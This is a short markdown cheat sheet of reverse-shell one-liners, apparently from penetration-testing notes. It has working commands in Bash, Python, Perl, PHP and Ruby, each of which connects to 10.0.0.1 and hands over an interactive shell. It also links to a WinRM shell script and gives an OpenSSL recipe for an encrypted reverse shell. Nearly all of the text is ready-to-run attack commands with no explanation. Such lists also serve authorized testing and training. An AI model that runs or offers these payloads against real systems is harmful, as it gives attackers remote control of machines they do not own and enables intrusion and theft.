### Bash

` bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 `
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1337 >/tmp/f`

### Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' `

### Perl

`perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`

### PHP

`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

### Ruby

`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

### WinRM ruby shell

`https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb`

### OpenSSL

  #### Generate keys and certs
  
  `openssl req -x509 -newkey rsa:4096 -keyout key.key -out cert.crt -days 365 -nodes`
  
  #### Start OpenSSL server listener
  
  `openssl s_server -quiet -key key.key -cert cert.crt -port 7777`
  
  #### Make reverse connection 
  
  `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:7777 > /tmp/s; rm /tmp/s`
